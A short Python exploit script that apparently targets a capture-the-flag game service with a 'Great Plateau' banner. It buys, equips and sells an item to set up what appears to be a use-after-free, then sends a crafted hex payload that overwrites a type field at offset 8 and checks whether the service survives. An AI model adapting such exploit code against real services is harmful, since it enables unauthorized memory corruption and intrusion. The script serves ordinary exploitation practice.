#!/usr/bin/env python3
import socket, time, re, struct, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2])
def connect_until_banner(tries=40):
    for i in range(tries):
        s=socket.socket(); s.settimeout(4)
        try: s.connect((HOST,PORT))
        except Exception: time.sleep(3); continue
        s.settimeout(2); b=b""
        try:
            while True:
                d=s.recv(4096)
                if not d: break
                b+=d
                if b"Great Plateau" in b: return s,b
        except Exception: pass
        s.close(); time.sleep(3)
    return None,None
def rx(s,pats,timeout=2.0):
    if isinstance(pats,str): pats=[pats]
    end=time.time()+timeout; out=b""
    while time.time()<end:
        s.settimeout(max(0.05,end-time.time()))
        try: d=s.recv(65536)
        except Exception: break
        if not d: out+=b"<EOF>"; break
        out+=d
        if any(p in out.decode('utf-8','replace') for p in pats): break
    return out.decode('utf-8','replace')
def cmd(s,c,pats,t=2.0):
    s.sendall(c.encode()+b"\n"); time.sleep(0.02); return rx(s,pats,t)
s,b=connect_until_banner()
if s is None: print("NO BANNER"); sys.exit(1)
print(b)
cmd(s,"shop buy 0 1",["tx: item added","not enough"])
cmd(s,"inv equip 1",["tx: main world equipped","invalid"])
cmd(s,"shop sell 1",["shop sold","invalid"])
# craft payload: 0xe8 bytes, decoded[8..15]=2 (type=2)
payload = bytearray(b"A"*0xe7)
struct.pack_into("<Q", payload, 8, 2)  # type=2 at offset 8
hexpayload = payload.hex()
print("[payload len] %d hex chars, decoded %d bytes"%(len(hexpayload), len(payload)))
o=cmd(s,"mw whisper 0 "+hexpayload,["whispered","only","accepts","<EOF>"],4)
print("[whisper out] "+o[-300:],flush=True)
time.sleep(0.2)
try:
    s.sendall(b"mw show\n"); time.sleep(0.3); s.settimeout(1); t=b""
    try:
        while True:
            d=s.recv(65536)
            if not d: break
            t+=d
    except Exception: pass
    print("[after] "+repr(t[:200]),flush=True)
except Exception as e: print("[dead] "+str(e),flush=True)
s.close()
